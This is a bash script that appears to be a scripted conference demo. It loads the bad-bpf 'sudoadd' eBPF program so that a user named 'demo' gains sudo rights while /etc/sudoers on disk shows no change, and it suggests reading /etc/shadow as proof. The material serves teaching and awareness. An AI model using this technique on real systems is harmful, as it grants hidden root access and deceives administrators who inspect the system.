#!/usr/bin/env bash
# Beat 6, step 3: load eBPF sudoadd so 'demo' can sudo with no change on disk.
# Narrate: "no CVE. The feature used exactly as designed."
#
# Run this in terminal A (the "attacker" loader). Then, in terminal B logged in
# as the 'demo' user, run:   sudo id     (or: sudo cat /etc/shadow)
set -euo pipefail

BIN="$(find /opt/ebpf-lab/bad-bpf -type f -executable -name sudoadd | head -n1 || true)"
[[ -n "${BIN:-}" ]] || { echo "ERROR: sudoadd binary not found. Build bad-bpf first." >&2; exit 1; }

echo "[*] /etc/sudoers on disk BEFORE loading (note: no 'demo' line):"
grep -n "^demo" /etc/sudoers 2>/dev/null || echo "   (no 'demo' entry in /etc/sudoers)"
echo
echo "[*] Loading eBPF sudoadd for user 'demo' ..."
# Flag name can differ by version; confirm once with:  "$BIN" --help
sudo "$BIN" --username demo >/tmp/sudoadd.log 2>&1 &
echo $! > /tmp/sudoadd.loader.pid
sleep 2

echo "[*] Loaded. In the 'demo' terminal now run:  sudo -l   then   sudo id"
echo "[*] /etc/sudoers on disk AFTER loading is STILL unchanged:"
grep -n "^demo" /etc/sudoers 2>/dev/null || echo "   (still no 'demo' entry — the grant is a kernel-level lie)"
echo
echo "    On stage: 'I didn't exploit a bug. There's no CVE. I used the feature as designed.'"
echo "    Loader PID $(cat /tmp/sudoadd.loader.pid). Run scripts/reset.sh to unload."
